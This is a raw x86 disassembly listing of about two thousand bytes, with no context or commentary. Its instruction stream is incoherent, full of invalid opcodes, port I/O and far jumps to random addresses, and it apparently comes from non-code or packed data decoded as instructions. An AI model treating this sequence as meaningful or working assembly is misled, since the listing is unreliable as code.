  407264:	add    DWORD PTR [eax],esi
  407266:	and    eax,0x79d7e2b4
  40726b:	loope  0x407242
  40726d:	gs repnz sub eax,0x9a2502a8
  407274:	in     al,dx
  407275:	jle    0x40725e
  407277:	push   ss
  407278:	fstp   TBYTE PTR [esi+eax*4]
  40727b:	(bad)  
  40727d:	adc    ch,bh
  40727f:	sbb    al,0x31
  407281:	mov    WORD PTR ds:0x30badd10,cs
  407287:	jg     0x4072bb
  407289:	inc    ebx
  40728a:	pop    esi
  40728b:	mov    BYTE PTR [ebp+eax*8+0x3699bbdc],dh
  407292:	jmp    0x407237
  407294:	push   cs
  407295:	sbb    eax,0x34629a52
  40729a:	mov    esp,0xc4848bde
  40729f:	(bad)  
  4072a0:	icebp  
  4072a1:	arpl   WORD PTR [edx],di
  4072a3:	add    DWORD PTR [eax],ebx
  4072a5:	int    0x8b
  4072a7:	aas    
  4072a8:	enter  0xb6da,0xc1
  4072ac:	mov    ds:0xd4c1f3c0,al
  4072b1:	add    BYTE PTR [eax+0xe],dh
  4072b4:	xchg   edx,eax
  4072b5:	call   0x6226:0x8977e16d
  4072bc:	inc    esi
  4072bd:	add    ebp,ecx
  4072bf:	jmp    0x4613c336
  4072c4:	and    BYTE PTR cs:[edx+esi*1+0x10],dl
  4072c9:	aad    0x87
  4072cb:	jp     0x40726f
  4072cd:	jge    0x407332
  4072cf:	imul   eax,DWORD PTR [edx],0xffffff87
  4072d2:	icebp  
  4072d3:	imul   DWORD PTR [edx+0x9]
  4072d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d7:	dec    DWORD PTR [edi-0x1bfc6385]
  4072dd:	enter  0x47d4,0x5f
  4072e1:	out    dx,al
  4072e2:	xor    al,al
  4072e4:	xchg   ecx,eax
  4072e5:	dec    esi
  4072e6:	inc    edx
  4072e7:	pop    ds
  4072e8:	in     eax,0xb7
  4072ea:	pop    ecx
  4072eb:	mov    ebx,0xd07d1a6f
  4072f0:	sti    
  4072f1:	cmp    BYTE PTR [ecx+0x10ab3ccc],al
  4072f7:	add    BYTE PTR [esi],dl
  4072f9:	das    
  4072fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072fb:	mov    dh,0xd8
  4072fd:	adc    al,0x6e
  4072ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407300:	adc    al,0xb4
  407302:	xchg   esi,eax
  407303:	sahf   
  407304:	mov    DWORD PTR [edi],ebx
  407306:	jbe    0x4072e6
  407308:	sub    BYTE PTR [eax],bh
  40730a:	sar    BYTE PTR [eax+0x7b],cl
  40730d:	inc    ebx
  40730e:	cwde   
  40730f:	lods   eax,DWORD PTR ds:[esi]
  407310:	call   0x33a9abe2
  407315:	mov    WORD PTR [edx-0x7d],es
  407318:	add    al,0xa1
  40731a:	pop    ds
  40731b:	jnp    0x407394
  40731d:	add    dl,BYTE PTR [ebx-0xcfbe06a]
  407323:	cmp    ebp,DWORD PTR [ecx+0x76626c34]
  407329:	xor    edi,edi
  40732b:	loop   0x40736e
  40732d:	les    esi,FWORD PTR [ecx+edx*2+0x5eff0839]
  407334:	cmp    dl,ch
  407336:	rcl    eax,1
  407338:	mov    esp,0xb17a37d8
  40733d:	mov    BYTE PTR [edi+0x6c],0x14
  407341:	xor    al,0xcd
  407343:	xchg   ebx,eax
  407344:	jno    0x407340
  407346:	mov    eax,0x7ed16cd1
  40734b:	pushw  0x20a9
  40734f:	mov    ecx,0xa76525bb
  407354:	lods   eax,DWORD PTR ds:[esi]
  407355:	in     eax,dx
  407356:	mov    ebp,0x7aec9828
  40735b:	or     eax,0x3f68d084
  407360:	xor    esp,ecx
  407362:	aaa    
  407363:	dec    edi
  407364:	test   al,0xb
  407366:	sbb    eax,0x15d81099
  40736b:	jne    0x407374
  40736d:	xchg   esi,eax
  40736e:	sbb    BYTE PTR [ecx],ah
  407370:	ss scas eax,DWORD PTR es:[edi]
  407372:	lods   eax,DWORD PTR ds:[esi]
  407373:	pop    eax
  407374:	ins    DWORD PTR es:[edi],dx
  407375:	jmp    0x386bbbcc
  40737a:	iret   
  40737b:	mov    cl,0xd6
  40737d:	fwait
  40737e:	mov    ebx,0x98be8e17
  407383:	(bad)  
  407384:	stos   DWORD PTR es:[edi],eax
  407385:	ja     0x4073b7
  407387:	mov    ecx,0x939aa757
  40738c:	cdq    
  40738d:	repz and al,0x94
  407390:	outs   dx,DWORD PTR ds:[esi]
  407391:	dec    ebp
  407392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407393:	test   al,0x61
  407395:	jno    0x407332
  407397:	push   ss
  407398:	jle    0x407408
  40739a:	imul   edx,DWORD PTR [edx+0x39],0x651caf3a
  4073a1:	jp     0x407359
  4073a3:	bound  edi,QWORD PTR [ebp-0x359bfb78]
  4073a9:	adc    ah,BYTE PTR [eax-0x77aef65f]
  4073af:	std    
  4073b0:	pop    edx
  4073b1:	push   ebp
  4073b2:	push   ebp
  4073b3:	(bad)  
  4073b4:	mov    dl,0x46
  4073b6:	jns    0x40735b
  4073b8:	(bad)  
  4073b9:	jmp    0xa153:0xd54c4a
  4073c0:	sbb    al,BYTE PTR [esi-0x57737fb3]
  4073c6:	jg     0x4073ec
  4073c8:	in     eax,dx
  4073c9:	and    eax,0x89043
  4073ce:	fild   WORD PTR [edi+0x7785220e]
  4073d4:	fs jecxz 0x407434
  4073d7:	sbb    BYTE PTR [ecx-0x2],dh
  4073da:	stos   BYTE PTR es:[edi],al
  4073db:	pop    ss
  4073dc:	cmp    eax,0x937e5a76
  4073e1:	xchg   edx,eax
  4073e2:	gs push es
  4073e4:	pop    eax
  4073e5:	inc    eax
  4073e6:	aam    0x26
  4073e8:	icebp  
  4073e9:	xchg   esp,eax
  4073ea:	xchg   ebp,eax
  4073eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ec:	mov    edx,0xeef56c56
  4073f1:	mov    ch,cl
  4073f3:	jl     0x4073e2
  4073f5:	jmp    FWORD PTR [edi+0x64f485a2]
  4073fb:	push   edi
  4073fc:	or     al,0xe6
  4073fe:	push   ebx
  4073ff:	or     cl,BYTE PTR [ecx-0x62]
  407402:	lahf   
  407403:	sbb    al,0xf5
  407405:	out    dx,al
  407406:	in     al,0x11
  407408:	bound  edi,QWORD PTR [ebp*4-0x209fc3b6]
  40740f:	adc    al,0x9
  407411:	mov    bh,0xa4
  407413:	sbb    al,0xb4
  407415:	mov    eax,ds:0xafb27a8f
  40741a:	mov    esp,0x2a0ce291
  40741f:	fnstcw WORD PTR [ebx+edx*8]
  407422:	mov    WORD PTR [esp+ecx*2],ss
  407425:	dec    ebp
  407426:	ds cmp eax,0x2353154f
  40742c:	ret    
  40742d:	and    eax,0x690de2a2
  407432:	gs js  0x407411
  407435:	and    DWORD PTR [ecx+0x3e],0x59
  407439:	mov    al,0xa4
  40743b:	add    dl,BYTE PTR ds:0xd6f7e82
  407441:	pop    esp
  407442:	jg     0x4074b8
  407444:	retf   0x7e27
  407447:	push   0xffffffef
  407449:	push   ebp
  40744a:	es sti 
  40744c:	pop    ds
  40744d:	out    dx,al
  40744e:	or     bl,BYTE PTR [esi+0x1d]
  407451:	out    0x8a,eax
  407453:	sbb    dh,ah
  407455:	popa   
  407456:	enter  0x46f6,0xea
  40745a:	cwde   
  40745b:	sub    esi,ebp
  40745d:	jno    0x4074d2
  40745f:	adc    bh,bl
  407461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407462:	jp     0x407450
  407464:	xchg   DWORD PTR [eax-0x41],edx
  407467:	jmp    0x4073f4
  407469:	pop    ebp
  40746a:	inc    esi
  40746b:	pop    ebx
  40746c:	add    eax,0x8758be66
  407471:	pop    esp
  407472:	jmp    0x111d:0x7194d0e8
  407479:	lods   eax,DWORD PTR ds:[esi]
  40747a:	push   ecx
  40747b:	cmc    
  40747c:	jecxz  0x4074ba
  40747e:	xchg   edi,eax
  40747f:	stos   DWORD PTR es:[edi],eax
  407480:	cs jns 0x4074af
  407483:	xor    esi,edi
  407485:	cmp    al,0xde
  407487:	sub    al,0xbd
  407489:	push   esp
  40748a:	and    DWORD PTR [ecx-0x539f3bc5],ecx
  407490:	pop    ss
  407491:	or     bh,dl
  407493:	or     eax,0x703fedab
  407498:	pushf  
  407499:	nop
  40749a:	xor    al,0xdc
  40749c:	mov    cl,0x5b
  40749e:	adc    eax,0xd1feb95
  4074a3:	xlat   BYTE PTR ds:[ebx]
  4074a4:	sti    
  4074a5:	inc    eax
  4074a6:	retf   
  4074a7:	jbe    0x407474
  4074a9:	jl     0x407485
  4074ab:	enter  0xb974,0x2
  4074af:	mov    eax,0x5d3ed6f4
  4074b4:	rcl    DWORD PTR [edx-0x3c],0x48
  4074b8:	dec    ecx
  4074b9:	imul   BYTE PTR [ecx]
  4074bb:	fistp  DWORD PTR [esi]
  4074bd:	pop    esp
  4074be:	sar    eax,cl
  4074c0:	pop    ecx
  4074c1:	xor    BYTE PTR [ecx-0x69],0x1e
  4074c5:	mov    esp,0xcd78d067
  4074ca:	and    BYTE PTR [eax+edx*4+0x18c778ad],dl
  4074d1:	inc    ebx
  4074d2:	scas   al,BYTE PTR es:[edi]
  4074d3:	sar    dl,cl
  4074d5:	push   ebp
  4074d6:	int3   
  4074d7:	call   0x4f78:0x817c1fcc
  4074de:	(bad)  
  4074df:	cs mov cl,0xe3
  4074e2:	xor    eax,0x92261210
  4074e7:	pushf  
  4074e8:	adc    DWORD PTR [edi+0x55],eax
  4074eb:	or     dl,BYTE PTR ds:0xab0d9e64
  4074f1:	push   edx
  4074f2:	push   ds
  4074f3:	or     esp,edx
  4074f5:	(bad)  
  4074f6:	sti    
  4074f7:	mov    esp,0xbc98fdf5
  4074fc:	hlt    
  4074fd:	push   edi
  4074fe:	cwde   
  4074ff:	inc    edx
  407500:	js     0x407508
  407502:	aaa    
  407503:	stc    
  407504:	test   BYTE PTR [ebx],cl
  407506:	sbb    DWORD PTR [eax+0x50c40ce],edx
  40750c:	push   edi
  40750d:	in     al,0x5b
  40750f:	xchg   esi,eax
  407510:	es pop es
  407512:	ss pusha 
  407514:	mov    ecx,0x553f5307
  407519:	aad    0xfb
  40751b:	into   
  40751c:	nop
  40751d:	test   al,0x5a
  40751f:	das    
  407520:	or     DWORD PTR [edi],ebp
  407522:	mov    ds:0xb2d49ad9,al
  407527:	std    
  407528:	pushf  
  407529:	aam    0xbe
  40752b:	fs sub edi,DWORD PTR ss:[bx]
  407530:	sbb    al,0x7
  407532:	ins    DWORD PTR es:[edi],dx
  407533:	cmp    eax,0x7443cfe7
  407538:	ins    DWORD PTR es:[edi],dx
  407539:	enterw 0x8a94,0x4c
  40753e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40753f:	popa   
  407540:	bound  edx,QWORD PTR [ecx+0x76]
  407543:	nop
  407544:	ins    BYTE PTR es:[edi],dx
  407545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407546:	add    al,0x88
  407548:	cmp    DWORD PTR [eax+0x6],esi
  40754b:	jae    0x4074f8
  40754d:	sub    eax,0xe8d3ec36
  407552:	popa   
  407553:	adc    eax,0x8935448e
  407558:	mov    fs,esi
  40755a:	or     BYTE PTR [ebx+eiz*4],bl
  40755d:	scas   eax,DWORD PTR es:[edi]
  40755e:	mov    bl,0x93
  407560:	test   al,0xfd
  407562:	sub    ecx,ebx
  407564:	js     0x4074ec
  407566:	and    dh,BYTE PTR [ebx-0x2d48d421]
  40756c:	and    eax,0x9d338249
  407571:	sub    BYTE PTR [edx],0xcb
  407574:	cmc    
  407575:	test   eax,0x6f4312b3
  40757a:	lods   eax,DWORD PTR ds:[esi]
  40757b:	(bad)  
  40757c:	repnz bound edi,QWORD PTR [eax-0xc6839e1]
  407583:	cmc    
  407584:	xchg   ecx,eax
  407585:	es mov ah,0x5b
  407588:	pop    esp
  407589:	pop    ss
  40758a:	push   edi
  40758b:	lods   al,BYTE PTR ds:[esi]
  40758c:	jl     0x4075df
  40758e:	cmp    DWORD PTR [ecx],esi
  407590:	pop    ebx
  407591:	add    bh,BYTE PTR [edi-0x51]
  407594:	aam    0x50
  407596:	add    esp,DWORD PTR [eax]
  407598:	das    
  407599:	pop    es
  40759a:	jns    0x4075f0
  40759c:	push   eax
  40759d:	cs fld st(7)
  4075a0:	cld    
  4075a1:	iret   
  4075a2:	adc    BYTE PTR [eax-0x2e081181],bl
  4075a8:	stos   DWORD PTR es:[edi],eax
  4075a9:	shr    DWORD PTR [eax+0x12],0x87
  4075ad:	push   ds
  4075ae:	adc    eax,0xd18561de
  4075b3:	pop    edi
  4075b4:	mov    esp,0x1bd3acd5
  4075b9:	out    0xa2,eax
  4075bb:	push   DWORD PTR [ecx-0x374c34c0]
  4075c1:	sub    eax,0xb918657a
  4075c6:	inc    ebp
  4075c7:	push   esp
  4075c8:	fidiv  DWORD PTR [edx+0x21]
  4075cb:	mov    ebx,0xbad274c4
  4075d0:	xchg   ecx,eax
  4075d1:	js     0x4075c9
  4075d3:	test   al,0x9e
  4075d5:	ins    BYTE PTR es:[edi],dx
  4075d6:	mov    ch,0xe8
  4075d8:	mov    dh,0xf
  4075da:	sbb    bh,BYTE PTR [edx-0x6d7527a9]
  4075e0:	stc    
  4075e1:	fld    QWORD PTR [ecx+0x7e312bcc]
  4075e7:	cmp    al,0x90
  4075e9:	sbb    eax,0xeb40a248
  4075ef:	repz cmp ebx,DWORD PTR [esi+0x53aee7fa]
  4075f6:	sbb    BYTE PTR [edi],0x38
  4075f9:	ja     0x407637
  4075fb:	pushf  
  4075fc:	je     0x40760c
  4075fe:	mov    bh,0x97
  407600:	retf   0x7232
  407603:	dec    esi
  407604:	je     0x407650
  407606:	jg     0x407634
  407608:	sub    eax,0x51bd7f83
  40760d:	inc    esp
  40760e:	fwait
  40760f:	sbb    al,0xf0
  407611:	sbb    eax,0x9886a0db
  407616:	cdq    
  407617:	es hlt 
  407619:	inc    eax
  40761a:	rcr    BYTE PTR ds:0x98e30122,0x95
  407621:	dec    ecx
  407622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407623:	popf   
  407624:	xchg   DWORD PTR [ebp+0x3f16f4c4],ecx
  40762a:	(bad)  
  40762b:	scas   al,BYTE PTR es:[edi]
  40762c:	dec    BYTE PTR ds:0xc5a279e1
  407632:	sub    DWORD PTR [ebx],edx
  407634:	xchg   ebx,eax
  407635:	mov    edx,DWORD PTR [eax+0x58]
  407638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407639:	xchg   DWORD PTR [eax+0x66],esi
  40763c:	mov    ah,0xd3
  40763e:	int3   
  40763f:	(bad)  
  407640:	nop
  407641:	call   0x4ed3:0x7b9008ca
  407648:	rcr    DWORD PTR [eax-0x16],cl
  40764b:	inc    ebx
  40764c:	(bad)  
  40764d:	in     eax,dx
  40764e:	cli    
  40764f:	mov    ch,0xd
  407651:	dec    ecx
  407652:	mov    WORD PTR [eax],ss
  407654:	xchg   esp,eax
  407655:	ror    DWORD PTR [edi],cl
  407657:	(bad)  
  407658:	xchg   BYTE PTR [edx],dl
  40765a:	std    
  40765b:	shl    DWORD PTR [esp+edx*1+0x1b],0x48
  407660:	push   0x9fec0cc0
  407665:	and    ch,BYTE PTR [edi]
  407667:	aaa    
  407668:	ds mov esp,0xc119535e
  40766e:	sub    ecx,DWORD PTR [edx+0x6d]
  407671:	scas   eax,DWORD PTR es:[edi]
  407672:	fwait
  407673:	xchg   edx,eax
  407674:	(bad)  
  407675:	jmp    0x8fcbe74f
  40767a:	mov    esi,0x394d4c89
  40767f:	jo     0x407688
  407681:	jl     0x4076c8
  407683:	lods   eax,DWORD PTR ds:[esi]
  407684:	xor    dl,BYTE PTR [edx-0x49]
  407687:	mov    esp,0x4b5f79db
  40768c:	xor    bh,dl
  40768e:	lds    ebp,FWORD PTR [edx-0x1ecb8ad9]
  407694:	xchg   bh,al
  407696:	add    eax,0x5b43a6c1
  40769b:	cmp    DWORD PTR [edx],edx
  40769d:	das    
  40769e:	scas   eax,DWORD PTR es:[edi]
  40769f:	sbb    ecx,DWORD PTR [ebp-0x19]
  4076a2:	push   0x6d
  4076a4:	mov    bh,0xa3
  4076a6:	adc    eax,0x3bc32697
  4076ab:	mov    ds:0x8a666e67,eax
  4076b0:	push   edi
  4076b1:	sar    BYTE PTR [eax-0x47fdca73],cl
  4076b7:	xlat   BYTE PTR ds:[ebx]
  4076b8:	sub    DWORD PTR [ebp+esi*8-0x2a],edi
  4076bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076bd:	or     ch,dl
  4076bf:	lock cmp BYTE PTR [esi-0x75],0xa3
  4076c4:	mov    cl,0x3
  4076c6:	enter  0x80de,0x34
  4076ca:	test   dl,dh
  4076cc:	cld    
  4076cd:	mov    cl,0x11
  4076cf:	mov    dl,BYTE PTR [edi+0x8]
  4076d2:	test   BYTE PTR [eax],ch
  4076d4:	jge    0x4076a7
  4076d6:	shl    DWORD PTR [ebp-0x265b4385],0x66
  4076dd:	into   
  4076de:	sub    dh,BYTE PTR [edi]
  4076e0:	cmp    BYTE PTR ds:0xca1c3680,cl
  4076e6:	in     eax,0x63
  4076e8:	push   ds
  4076e9:	ins    DWORD PTR es:[edi],dx
  4076ea:	dec    esp
  4076eb:	inc    ebp
  4076ec:	hlt    
  4076ed:	jg     0x4076ad
  4076ef:	ins    BYTE PTR es:[edi],dx
  4076f0:	push   ss
  4076f1:	cld    
  4076f2:	arpl   bx,di
  4076f4:	js     0x4076ba
  4076f6:	jle    0x4076b3
  4076f8:	(bad)  
  4076fa:	arpl   WORD PTR [edi],di
  4076fc:	cli    
  4076fd:	push   edi
  4076fe:	mov    DWORD PTR [esp+edi*2+0x63],ecx
  407702:	sbb    BYTE PTR [edx+edx*1],dl
  407705:	retf   0x4401
  407708:	sbb    eax,0xc1392f3e
  40770d:	push   ss
  40770e:	add    BYTE PTR [ebx-0x6c],bh
  407711:	pop    es
  407712:	dec    ebp
  407713:	into   
  407714:	mov    bh,0x82
  407716:	lods   al,BYTE PTR ds:[esi]
  407717:	(bad)  
  407719:	cmp    eax,0x1ba6779f
  40771e:	push   es
  40771f:	cmp    cl,bl
  407721:	fimul  DWORD PTR [edx-0x21ca0ff1]
  407727:	cli    
  407728:	inc    edx
  407729:	stos   BYTE PTR es:[edi],al
  40772a:	enter  0x9226,0xa
  40772e:	adc    BYTE PTR [ebx+0x128bb90b],dh
  407734:	retf   0xfc06
  407737:	les    eax,FWORD PTR [edi+esi*1]
  40773a:	inc    esp
  40773b:	xchg   esp,eax
  40773c:	cmc    
  40773d:	sbb    esp,esp
  40773f:	mov    bl,0xd5
  407741:	(bad)  
  407742:	ret    
  407743:	xchg   ecx,eax
  407744:	and    BYTE PTR [edx],dh
  407746:	mov    al,ds:0xb81987a1
  40774b:	stos   BYTE PTR es:[edi],al
  40774c:	call   0x9340d25d
  407751:	add    eax,0x188aa37c
  407756:	bound  ebx,QWORD PTR [ebp+0x22834ddf]
  40775c:	add    esp,edi
  40775e:	mov    esp,0x849d3fe7
  407763:	ds jmp 0x40772c
  407766:	outs   dx,DWORD PTR ds:[esi]
  407767:	iret   
  407768:	add    DWORD PTR [edi],edi
  40776a:	mov    dh,BYTE PTR [edi+0x4b039c31]
  407770:	into   
  407771:	mov    bl,BYTE PTR [eax+0x60]
  407774:	ds xchg ecx,eax
  407776:	cdq    
  407777:	test   DWORD PTR [ebx+0x30],ecx
  40777a:	cmp    BYTE PTR [esi+0x15f3fe7a],bl
  407780:	mov    ecx,0xccb0ab0f
  407785:	sbb    BYTE PTR [edx],bh
  407787:	jmp    0xf80a0ffd
  40778c:	inc    edx
  40778d:	cmc    
  40778e:	mov    esi,0x8cbdd45a
  407793:	fwait
  407794:	or     al,0x1d
  407796:	xchg   edx,eax
  407797:	ins    DWORD PTR es:[edi],dx
  407798:	mov    bl,0x69
  40779a:	add    bh,BYTE PTR [ecx+0x5e63c29d]
  4077a0:	adc    DWORD PTR [ebx+edi*4-0x1b0acbd7],eax
  4077a7:	dec    eax
  4077a8:	sti    
  4077a9:	rcr    DWORD PTR [edi+0x38f8ca6],1
  4077af:	push   ecx
  4077b0:	dec    ebp
  4077b1:	shl    al,cl
  4077b3:	jle    0x4077d3
  4077b5:	ss cmc 
  4077b7:	jecxz  0x40779a
  4077b9:	or     dl,BYTE PTR [eax+0x7f]
  4077bc:	test   BYTE PTR [ebx+0x6b],0xa6
  4077c0:	dec    edx
  4077c1:	add    ebp,eax
  4077c3:	popa   
  4077c4:	fcomip st,st(1)
  4077c6:	or     BYTE PTR [ecx+ebx*2+0x36],bl
  4077ca:	dec    ecx
  4077cb:	push   edx
  4077cc:	inc    edi
  4077cd:	adc    bh,bl
  4077cf:	cmp    dh,BYTE PTR [esi]
  4077d1:	call   0x66e3ea1b
  4077d6:	add    ch,BYTE PTR [eax-0x20]
  4077d9:	dec    esp
  4077da:	lods   al,BYTE PTR ds:[esi]
  4077db:	rcr    DWORD PTR [ecx],cl
  4077dd:	jmp    0x7ef036ed
  4077e2:	pop    edx
  4077e3:	push   es
  4077e4:	xor    eax,0xc38a5023
  4077e9:	fwait
  4077ea:	inc    edx
  4077eb:	pop    edi
  4077ec:	test   BYTE PTR [ebp-0x210aa67e],bl
  4077f2:	sar    dh,1
  4077f4:	mov    ds:0xbb330dee,al
  4077f9:	leave  
  4077fa:	push   eax
  4077fb:	sub    al,0x93
  4077fd:	dec    edx
  4077fe:	mov    eax,gs
  407800:	loop   0x4077cc
  407802:	pop    ebp
  407803:	aad    0x9a
  407805:	popf   
  407806:	les    eax,FWORD PTR ds:0x2b52404d
  40780c:	adc    eax,0x1d639037
  407811:	xchg   esi,eax
  407812:	pop    es
  407813:	int    0x74
  407815:	add    DWORD PTR [edi],esp
  407817:	(bad)  
  407819:	xlat   BYTE PTR ds:[ebx]
  40781a:	mov    ecx,0x20eb9ab2
  40781f:	or     ecx,edx
  407821:	scas   al,BYTE PTR es:[edi]
  407822:	mov    ecx,0x8be32a71
  407827:	(bad)  
  407828:	push   0xfffffff1
  40782a:	sti    
  40782b:	add    DWORD PTR [ebx+eiz*4+0x436740fc],0xbeee466d
  407836:	cmp    al,0x40
  407838:	addr16 in eax,0x2e
  40783b:	aam    0xd4
  40783d:	mov    bl,0xba
  40783f:	in     eax,dx
  407840:	and    BYTE PTR [edi],bl
  407842:	push   0x290b4202
  407847:	dec    eax
  407848:	xchg   BYTE PTR ds:0xf7500c83,al
  40784e:	adc    DWORD PTR [edi+0x6e46ecc7],ebp
  407854:	daa    
  407855:	(bad)  
  407857:	sub    BYTE PTR [edx+0x6e],al
  40785a:	ds nop
  40785c:	hlt    
  40785d:	in     eax,0x7f
  40785f:	inc    edi
  407860:	mov    BYTE PTR [edx],dh
  407862:	mov    esp,0x75db5f04
  407867:	add    BYTE PTR [ebx-0x4dd3adfa],bh
  40786d:	enter  0x1f39,0xa2
  407871:	ret    0xe3f6
  407874:	and    eax,0x856cb84
  407879:	mov    eax,0x9ba68733
  40787e:	mov    ebx,0xac80a9e5
  407883:	rcl    DWORD PTR [esi],cl
  407885:	jno    0x4078da
  407887:	cs push eax
  407889:	sbb    ah,BYTE PTR [edi+0x34c6b52f]
  40788f:	call   0x5326ec99
  407894:	dec    edi
  407895:	nop
  407896:	out    dx,eax
  407897:	ja     0x40789b
  407899:	or     bh,dh
  40789b:	scas   al,BYTE PTR es:[edi]
  40789c:	dec    edx
  40789d:	das    
  40789e:	xor    bl,BYTE PTR [eax-0x142d96b5]
  4078a4:	sub    esi,edi
  4078a6:	scas   al,BYTE PTR es:[edi]
  4078a7:	outs   dx,DWORD PTR ds:[esi]
  4078a8:	std    
  4078a9:	fist   WORD PTR [ebx]
  4078ab:	and    eax,0x330ef2e9
  4078b0:	pop    edx
  4078b1:	xor    eax,DWORD PTR [ebx+0xf]
  4078b4:	pop    ds
  4078b5:	retf   
  4078b6:	(bad)  
  4078b7:	pop    ebx
  4078b8:	mov    ecx,0xe9141aa7
  4078bd:	xor    eax,0xe11ab3df
  4078c2:	ficomp DWORD PTR [edx]
  4078c4:	push   ebp
  4078c5:	xchg   ebx,eax
  4078c6:	cmp    BYTE PTR [edi+0x51e40912],ah
  4078cc:	ds fucomp st(6)
  4078cf:	aaa    
  4078d0:	and    DWORD PTR [edx],0x28
  4078d3:	add    al,ah
  4078d5:	fst    DWORD PTR [ecx]
  4078d7:	imul   ebx,DWORD PTR [esi],0x55683e9c
  4078dd:	jmp    0x4078b6
  4078df:	or     eax,0xc2939dd6
  4078e4:	ja     0x4078f0
  4078e6:	sub    DWORD PTR [ecx],edx
  4078e8:	ret    
  4078e9:	pop    ecx
  4078ea:	clc    
  4078eb:	in     al,0x3c
  4078ed:	jae    0x407891
  4078ef:	jle    0x407906
  4078f1:	in     eax,0x85
  4078f3:	shl    dl,cl
  4078f5:	ds pop ss
  4078f7:	psubusw mm2,mm0
  4078fa:	stc    
  4078fb:	mov    edi,0xaeb1a543
  407900:	pop    edx
  407901:	punpckhbw mm7,QWORD PTR [edi-0x21]
  407905:	pop    esi
  407906:	mov    cl,0xdd
  407908:	dec    esp
  407909:	js     0x40790f
  40790b:	sub    DWORD PTR ds:0xfe8fd400,esi
  407911:	fmul   DWORD PTR [eax]
  407913:	retf   
  407914:	daa    
  407915:	sbb    DWORD PTR [ebx],ecx
  407917:	(bad)  
  407918:	dec    edx
  407919:	and    dh,BYTE PTR [ebx-0x361226ad]
  40791f:	and    BYTE PTR [ebx],cl
  407921:	in     eax,0x2
  407923:	call   0x94152371
  407928:	jl     0x407969
  40792a:	mov    ah,0x5e
  40792c:	cmp    bl,BYTE PTR [ecx]
  40792e:	or     esp,DWORD PTR [edi+edi*1+0x46]
  407932:	outs   dx,BYTE PTR ds:[esi]
  407933:	fidiv  DWORD PTR [ebp-0x3f1969]
  407939:	xchg   ebp,eax
  40793a:	sbb    eax,0x8d2530f4
  40793f:	clc    
  407940:	adc    DWORD PTR [eax-0x12],esi
  407943:	sbb    eax,0x17b42c0c
  407948:	and    BYTE PTR [esi+ecx*1],dl
  40794b:	dec    ecx
  40794c:	mov    cl,0xca
  40794e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40794f:	es call 0xe7336cd1
  407955:	aas    
  407956:	enter  0x26d,0x7a
  40795a:	loope  0x407976
  40795c:	dec    DWORD PTR [edx]
  40795e:	hlt    
  40795f:	mov    al,dl
  407961:	and    DWORD PTR [edx+0x7],ebx
  407964:	pop    ecx
  407965:	push   ds
  407966:	mov    edi,0x66b001d8
  40796b:	xchg   edi,eax
  40796c:	in     al,0x67
  40796e:	cmp    bl,dh
  407970:	push   ds
  407971:	jno    0x4079cd
  407973:	test   DWORD PTR [eax+0x5e],esi
  407976:	call   FWORD PTR [eax+0x6a]
  407979:	inc    ebp
  40797a:	sbb    esp,esi
  40797c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797d:	xchg   esi,eax
  40797e:	dec    eax
  40797f:	out    dx,al
  407980:	xchg   ecx,eax
  407981:	ror    al,cl
  407983:	pushf  
  407984:	push   edi
  407985:	mov    esi,es
  407987:	sbb    ah,BYTE PTR [eax]
  407989:	das    
  40798a:	mov    WORD PTR [esi],ds
  40798c:	and    DWORD PTR [ecx+0x5d],esp
  40798f:	ja     0x407951
  407991:	and    ebp,DWORD PTR [ecx]
  407993:	loopne 0x407925
  407995:	int3   
  407996:	scas   al,BYTE PTR es:[edi]
  407997:	sbb    BYTE PTR [eax],dh
  407999:	dec    ecx
  40799a:	and    ebp,ecx
  40799c:	(bad)  
  40799d:	mov    eax,0xca827c20
  4079a2:	retf   0x60ba
  4079a5:	mov    al,0x51
  4079a7:	xchg   edx,eax
  4079a8:	daa    
  4079a9:	xor    BYTE PTR [eax-0x11],cl
  4079ac:	mov    dl,0xea
  4079ae:	push   ecx
  4079af:	in     eax,0xc1
  4079b1:	sub    BYTE PTR [esi-0x70eb77a8],0xca
  4079b8:	add    eax,0x8c6df24e
  4079bd:	mov    dh,0x67
  4079bf:	jno    0x40798e
  4079c1:	xchg   edx,eax
  4079c2:	mov    edi,DWORD PTR [ebp+0x4d32a5a9]
  4079c8:	sub    DWORD PTR [edx],0x4205bf14
  4079ce:	pusha  
  4079cf:	jp     0x407a09
  4079d1:	outs   dx,DWORD PTR ds:[esi]
  4079d2:	inc    ebx
  4079d3:	loop   0x40797f
  4079d5:	mov    WORD PTR [ebp+0x3c570d8e],es
  4079db:	mov    ds:0x31f1698,eax
  4079e0:	pusha  
  4079e1:	sbb    edi,DWORD PTR [ebp-0x23d46ae8]
  4079e7:	repnz dec ebx
  4079e9:	shl    dh,0xa
  4079ec:	stc    
  4079ed:	mov    ecx,0x72902589
  4079f2:	mov    cl,0x8d
  4079f4:	aas    
  4079f5:	mov    edi,0x4566d1f
  4079fa:	imul   esi,DWORD PTR [edx+0x5d],0x72
  4079fe:	jle    0x407a73
  407a00:	fwait
  407a01:	div    BYTE PTR [ebp+0x61]
  407a04:	cld    
  407a05:	clc    
  407a06:	dec    edx
  407a07:	add    BYTE PTR [eax+eiz*2],0x9e
  407a0b:	fisubr WORD PTR [ecx+0x57]
  407a0e:	imul   edx,edi,0xaf9a5cbe
  407a14:	(bad)  
  407a15:	cmp    ah,BYTE PTR [ebp-0x1a]
  407a18:	adc    DWORD PTR [edi-0x2d],edx
  407a1b:	leave  
  407a1c:	js     0x4079fb
  407a1e:	sub    ebp,DWORD PTR ds:0xaf93fd28
  407a24:	jno    0x407a1a
  407a26:	sub    eax,0xd7ff5e3d
  407a2b:	lods   eax,DWORD PTR ds:[esi]
  407a2c:	shl    DWORD PTR [ecx+0x25],cl
  407a2f:	ss loopne 0x4079cb
